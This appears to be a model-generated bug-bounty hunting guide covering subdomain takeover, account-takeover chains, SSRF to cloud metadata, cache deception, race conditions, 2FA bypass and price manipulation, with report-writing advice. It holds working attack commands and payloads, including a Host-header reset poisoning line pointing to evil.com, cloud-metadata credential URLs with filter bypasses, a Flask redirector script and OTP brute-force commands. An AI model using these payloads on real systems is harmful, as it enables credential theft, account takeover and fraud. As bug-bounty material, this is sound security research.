# glm-5.3 — bb-classes

# High-Payout Bug Classes: Hunting Guide

## 1. Subdomain Takeover (Full Flow)

**How to find:**

```bash
# Enumerate subdomains
subfinder -d target.com -all -o subs.txt
amass enum -passive -d target.com >> subs.txt
# Resolve which are dangling
cat subs.txt | httpx -silent -status-code -follow-hosts -no-color | grep -E "404|NXDOMAIN|connection refused"
# Or check DNS directly
cat subs.txt | dnsx -a -resp -silent | awk '{print $1}' | while read d; do
  host "$d" | grep -q "not found" && echo "DANGLING: $d"
done
```

```bash
# Fingerprint the CNAME target
cat subs.txt | dnsx -cname -resp -silent | tee cnames.txt
# Common takeover fingerprints
cat cnames.txt | grep -E "s3.amazonaws.com|herokudns.com|azurewebsites.net|cloudfront.net|github.io|herokussl.com|fastly.net|netlify.app|vercel.app|zendesk.com|unbouncepages.com|surge.sh|bitbucket.io|shopify.com|gitlab.io"
```

For each fingerprint, confirm via HTTP response body:

| Service | Fingerprint response |
|---|---|
| S3 | `<Error><Code>NoSuchBucket</Code>` |
| Azure | `404 Web Site not found.` |
| CloudFront | `ERROR: The request could not be satisfied` + `NoSuchDistribution` |
| GitHub Pages | `There isn't a GitHub Pages site here.` |
| Heroku | `No such app` |
| Fastly | `Fastly error: unknown domain:` |
| Shopify | `Sorry, this shop is currently unavailable` |
| Netlify | `Not Found - Request ID: ...` |
| Zendesk | `Help Center Closed` |
| Vercel | `DEPLOYMENT_NOT_FOUND` |

**Exploitation flow (S3 example):**

```bash
aws s3api create-bucket --bucket dangling-bucket-name --region us-east-1
aws s3api put-bucket-website --bucket dangling-bucket-name \
  --website-configuration '{"IndexDocument":{"Suffix":"index.html"},"ErrorDocument":{"Key":"error.html"}}'
echo '<html><body><h1>Takeover POC</h1></body></html>' > index.html
aws s3 cp index.html s3://dangling-bucket-name/index.html
curl -I http://dangling.target.com  # 200 OK, your content served
```

**Report angle:** Frame as full account-cookie theft on the apex domain, not "defacement possible." Show `document.cookie = "session=..."` exfil proof-of-concept. Include the DNS record, the dangling CNAME, the service fingerprint, and a screenshot of attacker-controlled content rendering on the victim subdomain. Severity: Critical if session cookies can be scoped to the parent domain, otherwise High. Cite can-i-take-over-xyz as the reference template for remediation guidance — triagers love seeing the exact fix (delete the DNS record, or re-claim on the service).

---

## 2. Account Takeover Chains

**How to find:**

Password reset is the mother lode. Test every parameter:

```bash
# Response tampering
POST /api/v1/reset
{"email":"victim@target.com"}
# → 400 {"success":false,"msg":"invalid token"}
# Tamper: change false to true, or status code 400→200

# Host header injection
POST /api/v1/reset HTTP/1.1
Host: evil.com
Host: target.com   # try both, try X-Forwarded-Host: evil.com
{"email":"victim@target.com"}
# Reset email link now points to evil.com/token

# Token in referrer
# Click reset link, then click any outbound link on the page.
# Check target.com logs / Burp proxy history for Referer: target.com/reset?token=SECRET

# JWT confusion
# alg: none, kid path traversal, jku/ x5u injection, weak HMAC secret (crack with hashcat -m 16500)

# Email parameter pollution
{"email":"victim@target.com","email":"attacker@attacker.com"}
{"email[]":["victim@target.com","attacker@attacker.com"]}

# OTP brute force
POST /api/v1/verify-otp  {"otp":"000000"}   → rate-limit? response leaks timing?
# Burp Intruder 000000-999999, 6-digit = 1M requests, often unthrottled on /verify-otp
```

Check `X-RateLimit-*` headers on OTP endpoints. Check whether the token is generated predictably (`Math.random()` in JS bundle = seed-recoverable).

**Report angle:** Chain it. Single ATO primitives get downgraded; chains get paid. Good chain: Host header injection → reset email leaks token to attacker → full ATO → then pivot (access victim's saved payment methods, PII, or admin functions if the victim was a staff account). Add business impact quantification: "attacker gains saved credit cards, order history, and can change shipping address on future orders." Include remediation: server-side host validation, no user-supplied Host in URL generation.

---

## 3. SSRF to Cloud Metadata

**How to find:**

Target anything that fetches URLs: webhooks, PDF/image converters, import-from-URL, SSO/SAML metadata fetchers, webhook validators, file upload via URL, webhook integrations, "check link" features.

```bash
# Basic AWS IMDSv1 (works when IMDSv2 not enforced)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns AccessKeyId, SecretAccessKey, Token — now you own the instance's cloud identity
```

Bypasses for blocked `169.254.169.254`:

```
# Alternative metadata IPs / IPv6
http://[fd00:ec2::254]/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/  (needs header: Metadata-Flavor: Google)
# GCP full token:
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Header via DNS rebinding or redirect:
# Host: metadata.google.internal, but try: metadata.google.internal. (trailing dot)
# 169.254.169.254.nip.io  → resolves to 169.254.169.254
# Decimal encoding: 2852039166 = 169.254.169.254
# 0xa9.0xfe.0xa9.0xfe, 0251.0376.0251.0376 (octal)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
Header: Metadata: true
# Azure IMDS bypass via X-Forwarded-For:
X-Forwarded-For: 169.254.169.254
```

Redirect chain trick — host a redirector, point the target's fetcher at it:

```python
# redirector.py — target fetches http://your.server/x, you 302 to metadata
from flask import Flask, redirect
app = Flask(__name__)
@app.route('/x')
def x():
    return redirect('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 302)
app.run('0.0.0.0', 8000)
```

Most IP validators check the initial URL, not the post-redirect destination. Same works for DNS rebinding (`rebind.network`, or self-hosted `rbndr.us`).

**Report angle:** The credentials ARE the report — don't just say "SSRF." Show the role name, the permission scope (`aws sts get-caller-identity` output with account ID), and enumerate what those creds can touch: `aws s3 ls`, `aws sts assume-role` to lateral roles, `aws ec2 describe-instances`. Frame as "full cloud account compromise" if the role is over-privileged. Remediation: enforce IMDSv2 (`HttpTokens=required`), egress filtering, URL validation post-redirect. Never paste real credentials in the report — redact, show shape only.

---

## 4. Web Cache Deception on SaaS

**How to find:**

The victim's private response gets cached under a URL an attacker can request. Classic path-suffix tricks:

```
# Append fake static extension to authenticated page
/settings/profile/nonexistent.css
/settings/profile/.js
/settings/profile%3Bnonexistent.css  (semicolon — Tomcat/Nginx)
/settings/profile;%2Fnonexistent.css
# Path parameter smuggling
/settings/profile;x.js
# Encoded separators
/settings%2fprofile%2flogo.png
```

Also try `X-Original-URL: /private` on a cacheable public path, or header smuggling that causes the cache key to differ from what the origin sees.

Test methodology:

1. Log in as victim in one browser, visit `/settings/profile/fake.css`.
2. Open `/settings/profile/fake.css` in a private/incognito window (no auth).
3. If private window shows victim's data → cache deception confirmed.

Check which layer caches: `curl -I` and look for `X-Cache: HIT`, `CF-Cache-Status`, `Age:` header, `Server: cloudfront/squid/varnish`. Cloudflare/CloudFront are common on SaaS.

**Automation:**

```bash
# Param miner / burp extension: Web Cache Deception extension
# Or manual fuzz of suffixes:
for suffix in .css .js .ico .png robots.txt sitemap.xml favicon.ico; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -b "session=VICTIM_SESSION" "https://target.com/api/user/me/$suffix")
  echo "$suffix → $code"
done
# Then unauthenticated replay of any 200
curl -s "https://target.com/api/user/me/.css" | jq .
```

**Report angle:** Emphasize SaaS context — "cached `/api/v2/users/me` response contains full PII (email, billing address, org role), served to any unauthenticated user for the cache TTL." Show the cached-response headers proving the cache served it (`X-Cache: HIT`, `Age > 0`) to your unauthenticated replay. Higher severity than plain XSS-style WCD because it's cross-user data leak without victim interaction beyond a link click.

---

## 5. Race Conditions

**How to find:**

**Limit overrun / coupon reuse:**

```python
# Python 3.11+ single-packet approach via raw socket + asyncio, or use Burp's
# "Send group in parallel" (HTTP/2) — 20-30 requests, single TCP packet
# Burp: Repeater → select tabs → Create tab group → Send group (parallel)
```

```python
# Turbo Intruder script for coupon redemption
def queueRequests(word, pools):
    engine = RequestEngine(endpoint='https://target.com:443',
                           concurrentConnections=30,
                           requestsPerConnection=1,  # critical: new conn per req
                           pipeline=False)
    for i in range(30):
        engine.queue(Request, endpoint='POST /api/checkout HTTP/1.1',
                     body=f'{{"coupon":"SAVE50","items":[...]}}')

def handleResponse(req, interesting):
    if req.status == 200:
        table.add(req)
```

Key: `requestsPerConnection=1` forces separate connections but Burp's HTTP/2 parallel group sends them in one packet frame-batch — server processes them near-atomically. Against HTTP/1.1 backends behind Nginx, use Turbo Intruder's `engine.start()` with connection-per-request.

**TOCTOU in payments:**

```
1. Add item to cart at $100
2. Start checkout, capture POST /pay with amount=100
3. In a parallel session, apply coupon to the same cart
4. Replay the original /pay (amount=100) — if cart now totals $50 but server
   charges the captured amount after coupon applied, you win / or reverse:
   replay capture endpoint twice on a payment intent
5. Stripe-style: /payment_intents/:id/confirm — double-confirm in parallel
   to see if two captures land on one auth
```

Other TOCTOU: withdraw-balance-then-transfer, invite-code-then-redeem, gift-card-apply-then-remove-and-reapply (inventory deduction races), follow-request-then-block races on social apps.

**Report angle:** Show the server's response pair proving both requests hit the same resource concurrently and both succeeded (e.g., two 200s with the same coupon applied, or negative balance / double shipment). Business impact table: "attacker with $1 gift card redeemable N times gets N×$1 credit." Remediation: idempotency keys, database-level locking (`SELECT ... FOR UPDATE`), Redis `SETNX` on operation ID.

---

## 6. 2FA Bypass

**How to find:**

```bash
# Brute-force the OTP endpoint without rate limit
ffuf -u https://target.com/api/2fa/verify -X POST \
  -H "Content-Type: application/json" -H "Cookie: session=VICTIM_SESSION" \
  -w codes.txt -d '{"code":"FUZZ"}' -fr "invalid"

# Response body code difference
# 200 {"msg":"incorrect code"} vs 401 {"msg":"invalid"} vs 403 {"msg":"locked"}

# Skip step — directly hit post-2FA endpoints
curl -b "session=PRE_2FA_SESSION" https://target.com/dashboard
# If dashboard loads with only the pre-2FA session → 2FA is decorative

# Parameter / endpoint confusion
POST /api/2fa/verify  {"code":"123456"}   → change to {"code":123456} (int vs string)
{"code":"null"} {"code":0} {"code":""} {"code":[null]}
# "remember this device" token issued BEFORE 2FA completes → cookie already set

# Backup code endpoint often weaker
POST /api/2fa/backup  {"code":"ABCD-EFGH"}  → try predictable formats, no rate limit

# Session fixation: session ID pre- and post-login identical?
# Fix session → victim logs in → attacker uses fixed session

# OAuth/SSO flows that skip MFA for federated accounts
# Password reset flow that skips 2FA verification before allowing password change
```

Also test: OTP code reuse across accounts (code is a function of time only, not user), TOTP window manipulation, client-side generation of the expected code visible in JS bundle (rare but found in SPAs), SMS code length (4-digit = 10k brute force trivial).

**Report angle:** Frame as full ATO bypass: "attacker with only the victim's password gains full account access, defeating the MFA control the user believes protects them." Show bypass step-by-step with screenshots. If the skip-step variant works (session valid pre-2FA), demonstrate with a real login flow to `/dashboard` — triagers accept this instantly because it's a clean one-request PoC. Remediation: server-side rate limit on OTP, invalidate pre-2FA session, issue new session post-2FA.

---

## 7. Business Logic (Price / Quantity Manipulation)

**How to find:**

```bash
# Negative quantities in cart
PATCH /api/cart  {"items":[{"sku":"X","qty":-1}]}   # total drops
{"qty":-9999999}  # or price goes negative in server-side recalc

# Integer overflow / float precision
{"price": 0.000000001}
{"qty": 99999999999999999999}  # server truncates to 0 or wraps

# Price manipulation via stale reference
POST /api/checkout  {"item_id":"X","price": 0.01}
# Server trusts client-supplied price instead of looking up SKU price

# Currency mismatch
POST /api/checkout  {"price": 100, "currency":"JPY"}  # 100 JPY instead of 100 USD

# Race-apply coupon (see #5) — stack multiple coupons
POST /api/checkout  {"coupons":["A","B","A","B"]}

# Quantity edge: qty=1 free-with-purchase triggers infinite loop
# Add-then-remove: decrement stock but never re-increment (inventory desync)

# Payment amount divergence
POST /api/payment-intent  {"amount": 1, "currency":"usd", "order_total": 999}
# Server creates intent for $1, order ships for $999

# Refund/partial-refund abuse
POST /api/refund  {"order_id":X,"amount":999}  # exceeds original payment
POST /api/refund  {"order_id":X}  → repeat for same order
```

Burp's "Match and Replace" on quantity/price fields, plus Intruder on numeric types. Read the frontend JS bundle to find server-side validation gaps — the frontend's `calcTotal()` logic often mirrors what the backend forgot to enforce.

**Report angle:** Quantify in dollars. "I reduced a $2,000 order to $0.01 via `qty:-2` on the second item" with a screenshot of the confirmed order + payment receipt. Triagers accept fast when you show: (1) original price, (2) manipulated request, (3) resulting receipt. Note whether the manipulation persisted post-payment (order fulfillment) — that elevates it from "input validation" to "revenue loss." Remediation: server-side price lookup from catalog, non-negative integer constraints on quantity, idempotency on payment capture.

---

## General Report Template (applies to all seven)

```markdown
## Title: [Class] in [specific endpoint] leading to [business impact]
Severity: [P1/P2]  CVSS: [score]
### Summary (2 sentences)
### Steps to Reproduce
1. (exact request, raw HTTP)
2. (exact request)
3. (observed result, screenshot)
### Impact
- Concrete: [dollars, data types exposed, accounts affected]
- Chain: [can be combined with X to get Y]
### Remediation
[Specific fix — the exact header to add, the exact check to enforce]
### References
[CWE-XXX, prior accepted reports on same program]
```

Key acceptance multipliers: reproduce every claim with a raw request (not Burp screenshots alone), quantify impact in business terms, chain primitives when possible, and preempt remediation guidance so the fix looks trivial and the report doesn't sit in triage.

---

## [reasoning trace]


